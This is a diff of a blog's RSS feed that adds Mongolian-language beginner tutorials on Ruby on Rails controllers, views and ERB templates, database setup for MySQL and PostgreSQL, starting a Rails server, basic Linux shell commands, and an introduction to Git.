+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>Хоосон, ил хул, код байхгүй юм шиг санагдаж байна уу?
+Нѳгѳѳ гоё удамшил ороод ирсэн байгаа юм л даа. Энгийнээр бол SayController гэсэн class нь ApplicationController - оос удамшчихлаа гэж. Нэг ёсондоо автомотоор бүхий л default утгуудыг нь ѳѳртѳѳ авчихлаа гэсэн үг л дээ. Тэхээр дээр байгаа код юу хийж болох, эсвэл яг одоогоор ямар үүрэг гүйцэтгэж байна гэж хэдүүлээ ѳѳрсѳддѳѳ асуулт тавиад үзэцгээе. Одоогоор бол дээрх код юу ч хийхгүй, ямар ч үүрэггүй байгаа л гэсэн үг. Маш энгийн, бидэнд <code>hello()</code> бас <code>goodbye()</code> гэсэн хоёр хоосон (empty) action method - ууд л байна. Яагаад бас hello(), goodbye() гэсэн method гараад ирэв ээ, гэж гайхаж байгаа байх. Энэ хэсгийг ойлгохын тулд ѳѳр нэг хэсэг үрүү ѳндийж харахгүй бол болохгүй нь дээ. Rails Handles requests буюу ирж байгаа хүсэлтүүдийг зохицуулагч.</p>
+<h3 id="rails-болон-request-urls">Rails болон Request URLs</h3>
+<p>Яг л бусад веб апплкейшнуудын адил, Rails application - ын URL хаягийг хэрэглэгчтэй холбож ѳгч байгаа холболт юм. Тухайн URL - руу хандах хүсэлт browser - ээс явуулахад ар талд нь мэдээж тухайн хүсэлтийг боловсруулан (апп кодууд), эргүүлэн хэрэглэгч рүү хүргэх юм.
+Туршаад үзье. http://localhost:3000/say/hello - энэ хаяг руу хандалт хийгээд үзэцгээе.</p>
+<h3 id="action">Action</h3>
+<p>Дараагийн алхам маань дэлгэцэнд юу харуулах вэ гэх асуулт. Энэ хэсгээс л <code>View</code> орж ирж байгаа юм даа. Controller - шинээр үүсгэж байхдаа бид бүхэн ямар script ашиглаж байсныг санаж байна уу? Санахгүй байгаа бол эргүүлэн нэг хараарай. Тэр командаар терминал доошоо олон файл, directory үүссэн байхаа. Тэр дунд template файл буюу controller-ын views - үүссэн байгаа.. Үүннээс үзэхэд бид Say нэртэй controller үүсгэсэн. Тэгэхээр views маань app/view/say - directory-д байгаа юм.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span>&gt;Hello from Rails!&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span></code></pre></div><p>hello.html.erb - файлаа хадаглаад, browser - оо refresh хийгээд үзээрэй. Одоо ойлгосон байх, тийм үү.</p>
+<p>Дүгнээд нэг харахад, бид Rails Application Tree - гээс хоёр файлын утга, арга, үүрэг зэргийг судлаад эзэмшчихлээ. Controller  гэж юу болох талаар мэдэж авлаа, browser дээр template - modify хийж үзлээ. За тэгээд, Rails-ын шатлалыг харвал: controller нь app/controller дотор, views нь app/views гэсэн subdirectories дотор байрлаж байна.</p>
+<h3 id="dynamic">Dynamic</h3>
+<p>Апп гэж хэлэхэд хэцүү нэг энгийн static page ямартай ч хийчихлээ. Бага зэрэг Dynamic болговол ямарав, орох болгонд хэдэн цаг болж байгааг харуулдаг хэсэг нэмж ѳгцгѳѳе.
+Нэмэхийн тулд views-д байгаа template файлыг ѳѳрчлѳх хэрэгтэй. Цаг (Time) - харуулах string хэрэг болох юм. Үүнээс улбаалаад хоёр асуулт үүснэ. Нэгт, хэрхэн яаж Dynamic Content - оо одоо байгаа template - дээ нэмэх вэ? Хоёрт, цагаа хаанаа авах юм бэ?</p>
+<h3 id="dynamic-content">Dynamic Content</h3>
+<p>Райлс дотор Dynamic загвар оруулах олон арга бий. Хамгийн ѳргѳн ашигладдаг нь за одоо заагаад ѳгье. Ruby кодыг Template - тэйгээ embed (зарим энэ мэт үгийг орчуулахгүйгээр шууд хэрэглээд явна, угаасаа ч орчуулдахааргүй үг) хийх юм. Тиймээс л бид template файлаа show.html.erb гэж хадагалсан юм. Html.erb гэсэн формат залгаж бичсэн шалтгаан нь <code>ERB</code> гэсэн системыг Rails ѳрѳгжүүлэн дэмжээд явна.
+ERB нь Ruby - ын нэгэн хэсэг болж суудаг ба суулгах энэ тэрээ зүйл дээр санаа зовоод байх хэрэггүй. Erb нь output - үүдыг хувирган юу ч хамаагүй болгож болдог. Энгийнээр бол <code>&lt;%= and %&gt;</code> - гэх код нь Рубю кодоор танигдах хэдий ч үр дүнд нь string болон хѳрвүүлэгдэж байгаад л онцлог юм. Тэхээр &lt;% … %&gt; уг кодын дотор л утга аа оруулаад ѳгѳхѳд л үр дүн нь хэвлэгдэх юм. Жишээ нь:</p>
+<pre tabindex="0"><code class="language-ERB" data-lang="ERB">&lt;h1&gt;Hello from Rails!&lt;/h1&gt;
+&lt;p&gt;
+	Одоо цаг &lt;%= Time.now %&gt; болж байна.
+&lt;/p&gt;
+</code></pre><p>Одоо browser - оо refresh хийгээд үз. Харагдаж байгаа цаг бол Ruby - ын standard format - аар харагдаж байгаа.</p>
+<h3 id="цаг-нэмэх">Цаг нэмэх</h3>
+<p>Ерѳнхийдѳѳ applcation - оо Dynamic болгох ганц хоёр алхамтай танилцлаа.. Дараагийн алхам бол одоо харагдаж байгаа цаг нь хаанаас дамжин харагдаж байгааг тогтоон address хийж ѳгѳх юм.</p>
+<p>Ruby-гын <code>Time.now()</code> method нь embed хийж hello.html.erb загварт дуудан ѳгч ажиллаж байна. Хэрэглэгч, хандагч, уг page руу хандах бүр хэдэн цаг болж байгааг яг таг харуулж байна. Жижиг хэмжээний ѳѳрчлѳлт оруулж үзэцгээе. Одоо харагдаж байгаа view хэсгийг энэ чигт нь үлдээж controller хэсэгт цагийг байрлуулах шаардлагатай гэж үзээд Controller хэсэгт action method - ыг <code>@time</code> гэсэн хувьсагчид орлуулна. </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SayController</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ApplicationController</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hello</span>
+</span></span><span style="display:flex;"><span>	@time <span style="color:#f92672">=</span> <span style="color:#66d9ef">Time</span><span style="color:#f92672">.</span>now
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">goodbye</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>.html.erb - загвар дотор, controller хэсэгт оруулж ѳгсѳн хувьсагчаа орлуулж бичнэ.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span>&gt;Hello from Rails!&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt; 
+</span></span><span style="display:flex;"><span>  It is now <span style="color:#960050;background-color:#1e0010">&lt;</span>%= @time %&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">p</span>&gt; 
+</span></span></code></pre></div><p>Browser - ѳѳ refresh хийгээд харвал controller дээр нэмсэн хувьсагч маань views хэсэгт буюу энэ хоёрын хооронд утга дамжин амжилттайгаар дэлгэцэд хэвлэн харуулж байна. </p>
+<p>Яагаад заавал controller - оос харуулж байгаа зүйлийг views - дээр зарлан, хоёр гурван юм нэмж хийж, ажил удаад байгаа юм гэж гайхаж магадгүй. Уг Application - дотор бол ингэж хийсэн хийгээгүй нээх ѳѳрчлѳлт гарахгүй. Гэхдээ логикоор харвал ингэж хийх нь бидэнд ашигтай юм. Жишээ нь: 
+Application - оо цаашид хѳгжүүлж олон орны хэрэглэгч хандалт хийх боломжтой болгоё гэж тѳсѳѳлье. Үүн дээр үндэслэхэд, тухайн орны цагын бүсээс хамааран дэлгэцэнд хэдэн цаг болж байгааг харуулах нь чухал. Ингэж харуулахад хангалттай хэмжээний код нэмж бичих хэрэг болно. Харин энэ их хэмжээний код нь views - д тийм тохиромжтой шийдэл болж чадахгүй л болох уу! Харин controller - т цагийг харуулахаар шийдэж ѳгснѳѳр уг application - ыг илүү уян хатан боглож ѳгч байгаа ба controller хэсгээс ѳѳрчлѳсѳн цагын бүс нь views хэсэгт мѳн time object - ыг update хийгээд байх шаардлага байхгүй гэсэн үг юм. Цагыг Data гэж үз, тэгвэл заавал view болон controller - тэй холбогдсон байх шаардлагтай. Цаашид Model гэж судлаад ирэхээр бид энэ тухай илүү ихийг сурах болно.</p>
+<h3 id="дүгнээд-нэг-харвал">Дүгнээд нэг харвал</h3>
+<ul>
+<li>Хэрэглэгч уг application-нд хандалтыг local-оос http://localhost:3000/say/hello - URL хаягаар хандан орсон..</li>
+<li>Rails - routes - ыг тааруулж ѳгсѳн. 2 хэсэгт хуваан авч үзвэл, <code>say</code> хэсэг нь controller хэсгийг авч, ингэснээр Rails нь шинээр Ruby-гын SayController хэсгийг дуурайлган буюу удамшуулан үүсгэх боломжтой болсон. (app/controllers/say_controller.rb - гэх дарааллаар олж болно)</li>
+<li>Дараагийн хэсэгт нь <code>hello</code> - ыг action - гэдгийг тодорхойлсон. Rails нь тухайн нэрийн дагуу controller - оос method - ыг дуудсан. Энэхүү action method нь time object - ыг үүсгэж, <code>@time</code> гэсэн хувьсагч болгосон.</li>
+<li>Rails нь загвар ашиглан үр дүнг дэлгэцэд хэвлэдэг болсон. App/view directory -&gt; subdirectory нь controller-ын (say) - тэй адил нэрээр, тэрхүү subdirectory дотор hello.html.erb.</li>
+<li>Rails нь уг файлыг <code>ERB templating system</code> - руу боловсруулан, controller хэсэгт утгыг (value) заан Ruby - д оруулж (embed) ѳгсѳн.</li>
+<li>Үр дүнг browser дээрээс харахад, Rails хүсэлтүүдийг боловсруулан, ажиллаж байсан.</li>
+</ul>
+<h3 id="pages---үүдыг-холбох">Pages - үүдыг холбох</h3>
+<p>Нэг хуудастай Web Application гэж ч бас хаана байхав. Энэ удаа бид applicaiton - доо энгийн веб загвар хийж үзэцгээе.</p>
+<p>2 action - доо нэг controller ашиглана. Яагаад гэвэл бидэнд одоо шинээр controller - үүсгээд байх шаардлага гараагүй болохоор.</p>
+<p>Goodbye action - г controller - т define хийгээд ѳгчихсѳн болохоор одоо app/views/say дотор шинэ template үүсгэж ѳгѳх юм. Goodbye.html.erb гэж байгаа учир нь action нь default template загвар авах үедээ action - ын нэртэй холбогдож байдаг болохоор гэж ойлгож болно. </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span>&gt;Goodbye!&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt; 
+</span></span><span style="display:flex;"><span>	Энд байх сайхан байна.
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">p</span>&gt; 
+</span></span></code></pre></div><p>Browser - рүүгээ ороод энэ удаа URL хаягаа ѳѳрчлѳѳд хандалт хийнэ. http://localhost:3000/say/goodbye</p>
+<p>Харин одоо хоёр page - ээ хооронд нь холболт хийх хэрэгтэй. Hello page - ыг Goodbye page - тэй холбоно. Цаашид application хийхдээ хоорондын холболтыг button ашиглаж хийнэ, энэ удаа зүгээр hyperlink - ашиглаад хийчихье.</p>
+<p>hello.html.erb - иймэрхүү байдлаар:</p>
+<pre tabindex="0"><code class="language-erb" data-lang="erb">&lt;p&gt; 
+	Say &lt;a href=&#34;https://cadil.github.io/say/goodbye&#34;&gt;Goodbye&lt;/a&gt;! 
+&lt;/p&gt; 
+</code></pre><p>Харин goodbye.html.erb:</p>
+<pre tabindex="0"><code class="language-erb" data-lang="erb">&lt;p&gt; 
+	Say &lt;a href=&#34;https://cadil.github.io/say/hello&#34;&gt;Hello&lt;/a&gt;! 
+&lt;/p&gt; 
+</code></pre><p>Дээрx аргаар бичиж болно, асуудалгүй ажиллана. Нѳгѳѳ талаас жаахан эмзэг л болох юм даа. Уг Application - ынхаа web server - ыг ѳѳрчлѳѳд үзьѳ гэж бодоход URL - ууд шууд танихаа болино. 
+Тийм болохоор, бид иймэрхүү эрсдэл хүлээх хэрэг байхгүй. Rails цаанаасаа маш олон helper, methods байдаг болохоор ур аргуудыг views, template - д ашиглаж болно. Жишээл нь:
+<code>link_to()</code> - энэ method нь action - нд hyperlink үүсгэж ѳгдѳг жишээтэй. Басаж болохгүй, энэ method - ын хийж чадах зүйл их шүү. 
+hello.html.erb - дээ <code>link_to()</code> - ашиглаад үзье:</p>
+<pre tabindex="0"><code class="language-erb" data-lang="erb">&lt;h1&gt;Hello from Rails!&lt;/h1&gt;
+&lt;p&gt;
+	It is now &lt;%= @time %&gt;
+&lt;/p&gt;
+&lt;p&gt;
+	Time to say
+	&lt;%= link_to &#34;Goodbye&#34;, say_goodbye_path %&gt;!
+&lt;/p&gt;
+</code></pre><p>Түр зогсоод энэ мѳрийг сайн харьцгаая:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#f92672">&lt;%=</span> link_to <span style="color:#e6db74">&#34;Goodbye&#34;</span>, say_goodbye_path <span style="color:#f92672">%&gt;</span>
+</span></span></code></pre></div><p><code>Link_to</code> - оор дуудах үйлдэл хийгдэж байна. (Rails-д method-ыг templates, helpers- ыг бичихид илүү хялбар болгож ѳгсѳн)
+<code>say_goodbye_path</code> нь зам гээд ойлгоход болно доо.</p>
+<p>Goodbye.html.erb - мѳн адил аргаар:</p>
+<pre tabindex="0"><code class="language-erb" data-lang="erb">&lt;h1&gt;Goodbye!&lt;/h1&gt;
+&lt;p&gt;
+	It was nice having you here.
+&lt;/p&gt;
+&lt;p&gt;
+	Say &lt;%= link_to &#34;Hello&#34;, say_hello_path %&gt; again.
+&lt;/p&gt;
+</code></pre><p>За энэ хүрээд энгийн туршилтын application маань дуусаж байна. Дараагийн хичээлээр бид жинхэнэ application хийхэд суралцах болно. </p>
+<h3 id="юу-хийсэн-бэ">Юу хийсэн бэ?</h3>
+<ul>
+<li>Rails application хэрхэн шинээр үүсгэх, үүсгэсэн application - доо controller шинээр үүсгэж сурлаа.</li>
+<li>Хэрхэн Dynamic контентыг controller дээр үүсгэх, үүсгэсэн контентоо view - ыг ашиглан харуулахад суралцсан.</li>
+<li>Хэрхэн page хооронд холбох талаар үзлээ.</li>
+</ul>
+]]></content:encoded>
     </item>
     <item>
       <title>Rails болон ѳгѳгдлийн сан</title>
@@ -124,6 +1322,54 @@
       <pubDate>Mon, 04 Jan 2016 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2016-01-04-ror-with-database/</guid>
       <description>Ѳгѳгдлийн сан тайлбар, ѳгѳгдлийн сан суулгах</description>
+      <content:encoded><![CDATA[<h3 id="райлсапплкейшнг-ѳѳр-database--тэйхолбох">Райлс апплкейшнг ѳѳр database - тэй холбох</h3>
+<p>Райлс апплкейшнг ѳѳр database - тэй холбох гэж байгаа бол DB2, MySQL, Oracle, Postgres, Firefird болон SQL Server гэх мэтээр сонголтууд бий. SQLite 3 - ыг Райлс апплкейшнтэй холбож ашиглахын ѳмнѳ database driver суулгаж Library нь Райлсын database engine-тэй холбож ѳгѳх хэрэгтэй.</p>
+<blockquote>
+<p>Ѳѳрийн хувийн Rails API Documentation үүсгэх</p>
+</blockquote>
+<blockquote>
+<p>Local орчинд ѳѳрийн Rails API Documentation үүсгэх боломжтой юм. Маш энгийн, доорх командыг ѳѳрийн терминал дээр бичихэд л хангалттай.</p>
+</blockquote>
+<pre tabindex="0"><code>rails_apps&gt; rails new dummy_app
+rails_apps&gt; cd dumny_app
+dumny_app&gt; rake doc:rails
+</code></pre><blockquote>
+<p>Хамгийн сүүлд бичсэн мѳр бага зэрэг хугацаа авна. Уншиж дуусмагц, Rails API Documentation нь doc/api гэсэн directory tree үүснэ. Нэг зѳвѳлгѳѳ хэлэхэд уг directory-г ѳѳрийн desktop уруу хуулаад dumnуapp tree -г устгах нь зүйтэй. </p>
+</blockquote>
+<blockquote>
+<p>Rails API Documentation - хандах бол browser дээрээс doc/apo/index.html хаягаар орох боломжтой. </p>
+</blockquote>
+<p>Дэлгэрэнгүй мэдээллийг тухайн цахим хаягаар орон шалгана уу:</p>
+<ul>
+<li>DB 2: <a href="http://raa.ruby-lang.org/project/ruby-db2">http://raa.ruby-lang.org/project/ruby-db2</a> эсвэл <a href="http://rubyforge.org/projects/rubyibm">http://rubyforge.org/projects/rubyibm</a></li>
+<li>Firebird: <a href="http://rubyforge.org/projects/fireruby/">http://rubyforge.org/projects/fireruby/</a></li>
+<li>MySQL: <a href="http://www.tmtm.org/en/mysql/ruby/">http://www.tmtm.org/en/mysql/ruby/</a></li>
+<li>Oracle: <a href="http://rubyforge.org/projects/ruby-oci8">http://rubyforge.org/projects/ruby-oci8</a></li>
+<li>Postgres: <a href="https://bitbucket.org/ged/ruby-pg/wiki/Home">https://bitbucket.org/ged/ruby-pg/wiki/Home</a></li>
+<li>SQL Server: <a href="https://github.com/rails-sqlserver">https://github.com/rails-sqlserver</a></li>
+<li>SQLLite: <a href="https://github.com/luislavena/sqlite3-ruby">https://github.com/luislavena/sqlite3-ruby</a></li>
+</ul>
+<h3 id="mysql">MySQL</h3>
+<p>MySQL server болон client суулгая:</p>
+<pre><code>sudo apt-get install mysql-server mysql-client libmysqlclient-dev
+</code></pre>
+<p>Суулгах явцад root <code>user</code> - ын нууц үгийг шинээр үүсгэж ѳгнѳ.
+<code>libmysqlclient-dev</code> - ыг суулгаж ѳгснѳѳр mysql2 gem - ыг compile хийж Райлс аппд MySQL-ыг холбох тохиргоог хийж ѳгѳх юм.</p>
+<h3 id="postgresql">PostgreSQL</h3>
+<p>Шинэ repository-г нэмж ѳгѳѳд Postgre 9.3 суулгана:</p>
+<pre><code>sudo sh -c &quot;echo 'deb http://apt.postgresql.org/pub/repos/apt/ precise-pgdg main' &gt; /etc/apt/sources.list.d/pgdg.list&quot;
+wget --quiet -O - http://apt.postgresql.org/pub/repos/apt/ACCC4CF8.asc | sudo apt-key add -
+sudo apt-get update
+sudo apt-get install postgresql-common
+sudo apt-get install postgresql-9.3 libpq-dev
+</code></pre>
+<p>Postgre-г суулгах явцад <code>user</code> тохиргоог хийж ѳгѳхгүй. Тийм болохоор дээр зааврын дагуу хийж тохиргоогоо хийгээрэй. <code>chris</code> - оронд ѳѳрийн нэрийг бичин гэж бодох хэрэгтэй.</p>
+<pre><code>sudo -u postgres createuser chris -s
+# User-т нууц үгтэй хиймээр байна уу? Доорк коммандыг дагаад хийнэ үү.
+sudo -u postgres psql
+postgres=# \password chris
+</code></pre>
+]]></content:encoded>
     </item>
     <item>
       <title>Шинээр апплейкшн үүсгэх</title>
@@ -131,6 +1377,55 @@
       <pubDate>Mon, 04 Jan 2016 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2016-01-04-shineer-applieikshn-uusghekh.%D0%BC%D0%B4/</guid>
       <description>Шинээр апплейкшн үүсгэх</description>
+      <content:encoded><![CDATA[<h3 id="апп-үүсгэх">Апп үүсгэх</h3>
+<p>Шинээр райлс апплейкшн create хийхийн ѳмнѳ бид эхлэл хэсгээсээ эхлээд зохион байгуулал, эмх цэгцтэй байх хэрэгтэй. <strong>Work</strong> гэсэн нэртэй ** шинэ directory ** үүсгэнэ. Энэ ** work ** гэсэн directory дотор тѳслүүдээ шинээр үүсгээд явбал эмх цэгцтэй, амар юм. Work - дотор demo гэсэн райлс аппклейкшн үүсгэцгээе.</p>
+<pre><code>rubys&gt; mkdir work
+rubys&gt; cd work
+work&gt; rails new demo
+create
+create README.rdoc
+create Rakefile
+create config.ru
+    :   :	:	:
+create vendor/assets/stylesheets
+create vendor/assets/stylesheets/.keep
+   run bundle install
+Fetching gem metadata from https://rubygems.rog/.......
+	:   :	:	:
+Your bundle is complete!
+Use 'bundle show [gemname]' to see where a bundled gem is installed
+work&gt;
+</code></pre>
+<p>Дээр бичигдсэн ** rails new demo** коммандаар бид <strong>demo</strong> нэртэй ** directory** үүсгэлээ. Терминал доошоогоо subdirectory болон олон шинэ файлуудыг автомотаар default - аар үүсгэж ѳгѳв.</p>
+<pre><code>work&gt; cd demo
+demo&gt; ls -p
+app/  config/  db/  Gemfile.lock log/  Rakefile  test/   vendor/
+bin/  config.ru  Gemfile lib/    public/  README.rdoc  tmp/
+</code></pre>
+<p>Гэх мэтээр directory - ууд үүсгэх ба энэхүү chapter - т бид эдгээрийг ашиглах шаардлага одооогоор гарахгүй ба зѳвхѳн app/ directory-д ѳѳрсдийн кодоо бичих нэмж оруулах юм.</p>
+<p>Доорх коммандаар дэлгэрэнгүй мэдээлэл авах боломжтой:</p>
+<pre><code>demo&gt; rake about
+</code></pre>
+<p>Мѳн дээрх кодоор алдаа хайж болдог ба жишээ нь JavaScript runtime  - олдохгүй байгаа бол алдааны мэдээлэл гаргаж боломжит линкүүдээс татаж авах хүсэлт ирүүлнэ.</p>
+<p><strong>rake about</strong> - аар алдаа илэрээгүй бол цааш үргэлжүүлцгээе. Одоо юу хийх хэрэгтэй вэ гэхээр Stand-alone Web server - ыг асаахад л болно. Ингэж server асааж байж л бид шинээр үүсгэсэн райлс аппклейншаа ажиллуулах юм.</p>
+<pre><code>demo&gt; rails server
+=&gt; Booting WEBrick
+=&gt; Rails 4.0.0 application starting in development on http://0.0.0.0:30000
+=&gt; Run 'rails server -h' for more startup options
+=&gt; Ctrl+C to shutdown server
+[2013-04-18 20:22:16] INFO WEBrick 1.3.1
+[2013-04-18 20:22:16] INFO ruby 2.0.0 (2013-02-24) [x86_64-linux] 
+[2013-04-18 20:22:16] INFO WEBrick::HTTPServer#start: pid=25170 port=3000
+</code></pre>
+<p>Web Server нь ямар server суулгасан эсэхээс шалтгаалан ажиллах ба Ruby-гийн хувьд <strong>WEBrick server</strong> нь ruby-гийн цѳм нь болж ѳгсѳн нэг үгээр бол ruby-г илтгэж чадахаар нэгэн бүхэл хэсэг нь болсон сервер юм. Гэхдээ яах уу, ѳѳрийн дурын веб серверыг суулган Ruby on Rails тай хослуулан ажиллуулж болно. </p>
+<p>Доорк коммандыг ашиглан WEBrick-ыг хүчлэн (force) ажиллуулж болно.</p>
+<pre><code>demo&gt; rails server webtrick
+</code></pre>
+<p>Сервер асаасан код боксын хамгийн сүүлийн мѳрийг харвал server нь port:3000 дээр ассан байна. 0.0.0.0 гэсэн холболтыг авч үзвэл WEBrick нь тухайн address-д connection - д бүхэл талын зѳвшѳѳрлыг олгож байна гэж ойлгож болно. Ойлгогдохоор хэлбэл дурын browser дээр <strong>http://localhost:3000</strong> address - аар хандан сервер рүү холбогдох юм.</p>
+<p>Сервер ээ асаагаад localhost-oos харж болж байна. Терминал дээр сервер дээр болж байгаа үйл явцыг <code>tracking</code> - хийх боломжтой юм.</p>
+<p><code>Ctrl + C</code> - командыг ашиглан WEBrick-ыг унтраана. Гэхдээ одоохондоо битгий унтраагаарай бид цааш үргэлжлүүлэн явах болхлоор…</p>
+<p>Апплкейшнаа үүсгээд сервер ээ асаачихлаа, харин ерѳѳсѳѳ код бичсэнгүй ээ, тийм ээ? Дараагийн хэсгээс код уруу орцгооё!</p>
+]]></content:encoded>
     </item>
     <item>
       <title>Энгийн коммандууд</title>
@@ -138,6 +1433,40 @@
       <pubDate>Mon, 04 Jan 2016 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2016-01-04-command-line/</guid>
       <description>Энгийн коммандуудын тайлбар</description>
+      <content:encoded><![CDATA[<h3 id="оршил">Оршил</h3>
+<p>Руби дээр ажиллаж байх үед терминалтай бол байнга ажиллана. Хэрвээ терминал дээр ажиллаж мэдэхгүй бол анхан шатны хэдэн коммандуудын үүргийг тайлбарлан бичсэн байгаа.</p>
+<h4 id="sudo-kомманд">SUDO Kомманд</h4>
+<p>Дийлэнх комманд нь sudo - оор эхэлдэг. <strong>SUDO</strong> буюу superuserdo нь тухайн роот хэрэглэгчийн бүрэн эрхийг идэвхжүүлэх, тухайн роот хэрэглэгчийн фолдер, файлыг бүрэн эрхтэйгээр удирдах эрх олгож байгаа юм. Sudo коммандыг ашиглах үѳд гараас хэрэглэгчийн нууц үгийг оруулж ѳгѳх ёстой.</p>
+<h4 id="файл-болон-зам-directory">Файл болон Зам (Directory)</h4>
+<p>Долгионтой тэмдэгт (~) ээр home directory-г илэрхийлнэ. Xэрэглэгч буюу user, долгионтой тэмдэгт (~) харагдаж байвал /home/user directory-д байна гэсэн үг.</p>
+<h4 id="pwd">pwd</h4>
+<p>Энэ коммандын тусламжтайгаар аль directory-д байгаагаа мэдэж болно. Нэг үгээр бол замыг хэвлэн дэлгэцэнд харуулна. Жишээлбэл: Desktop directory дотор pwd комманд бичсэн гэж үзэхэд “~/Desktop” гэснийг терминал дээр хэвлэн харуулах юм. </p>
+<h4 id="ls">ls</h4>
+<p>Directory дотор байгаа файлуудын list буюу нэрс, агуулгыг харуулна. ls -ын араас ѳѳр коммандууд ашиглан, тухайн directory дотор байгаа файлуудын хэмжээ, тѳрѳл, үүссэн огноо гэх мэт дэлгэрэнгүй мэдээллийг харах боломж бий.</p>
+<h4 id="cd">cd</h4>
+<p>Тухайн directory - чиглэлыг ѳѳрчлѳх, нэг directory-гоос нѳгѳѳ directory уруу орох ерѳнхий үүрэгтэй.
+ </p>
+<ul>
+<li>root directory уруу хандах үѳд “cd /”</li>
+<li>home directory уруу хандах үед “cd” эсвэл “cd ~”</li>
+<li>Нэг алхамаар урагшлах үѳд “cd ..”</li>
+<li>Ѳмнѳх directory уруу буцах үед “cd -”</li>
+</ul>
+<h4 id="cp">cp</h4>
+<p>Файлыг хуулах, copy хийх үүрэг гүйцэтгэнэ. Жишээлбэл: “cp file foo” нь file - хуулах үйлдэл хийн хуулж байгаа файлдаа “foo” нэртэй нэр ѳгч байна. Directory, copy хийх гэж байгаа бол “cp -r directory foo” (рекурс хуулах). Рекурс нь ямар учиртай вэ? Directory-г хуулах үѳд бүх файлуудыг нь хуулах үйлдийг давтах гэх мэтээр…</p>
+<h4 id="mv">mv</h4>
+<p>Файлыг ѳѳр байршил уруу шилжүүлэх мѳн нэр ѳѳрчлѳх үүрэгтэй. Жишээлбэл: “mv file foo” нь file - ын нэрийг foo болгон ѳѳрчилж байна. “mv foo ~/Desktop” комманд нь foo нэртэй файлыг Desktop Directory уруу шилжүүлж байна. </p>
+<h4 id="rm">rm</h4>
+<p>Энэхүү коммандыг ашиглан файл усгтаж болно. Жишээлбэл: “rm -f user/desktop/foo” нь user-ын Desktop directory-гоос force-оор foo файлыг устгаж байна.</p>
+<h4 id="rmdir">rmdir</h4>
+<p>Хоосон directory-г устгах үед ашиглана. Харин дотроо файл болон контент агуулагдаж байгаа directory-г устгахын тулд “rm -r” коммандыг ашиглана.</p>
+<h4 id="mkdir">mkdir</h4>
+<p>Шинээр directory үүсгэх үүрэгтэй. Жишээлбэл: “mkdir music” нь music нэртэй directory үүсгэж байна.</p>
+<h4 id="man">man</h4>
+<p>Ѳѳр бусад коммандуудын хэрэглэх аргачлал, зааврыг харуулна. Жишээлбэл: “man man” гэж бичихэд man коммандыг үүрэг, хэрхэн ашиглах гэх мэт document гарч ирнэ. </p>
+<h4 id="sudo">sudo</h4>
+<p>Зѳвхѳн Root user - д зѳвшѳѳрѳл олгох үүрэгтэй. Жишээлбэл: home directory-гын гаднаас файл хуулах шаардлага гарлаа гэж бодоё. “mv /mydoc.odt ~/Documents/mydoc.odt” гэж бичин гэж бодож байвал энэ нь буруу юм. Яагаад гэвэл home directory - гын гаднаас юм оруулах зѳвшѳѳрѳл бидэнд байхгүй байгаад юм. Харин “sudo mv /mydoc.odt ~/Documents/mydoc.odt” гэж бичиж ѳгснѳѳр бүгд хэвийн ажиллана. sudo коммандыг ашиглаж байгаа үѳд болгоомжтой байх нь чухал. Root user - ээр хандаж байгаа үѳд system - ээ ч гэмтээх магадал бий болохоор.</p>
+]]></content:encoded>
     </item>
     <item>
       <title>Git</title>
@@ -145,6 +1474,29 @@
       <pubDate>Sun, 03 Jan 2016 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2016-01-03-git/</guid>
       <description>Version Control болон Git CLI</description>
+      <content:encoded><![CDATA[<h3 id="version-control">Version Control</h3>
+<p>Version Control - д Github, BitBucket - гээд олон байгаа. Дийлэнх тохиолдолд Git-ыг ашиглана. Git дээр райлс дээр хѳгжүүлэлт хийж байгаа тѳслѳѳ commit хийх ба ѳѳрчлѳлт бүрийг оруулаад тест хийж баталгаатай болгож байгаад commit хийгээд явах юм. Git дээр үүсгэсэн repository-д олон цагийг commit хийх болохоор энэ хэсэг их чухал юм.</p>
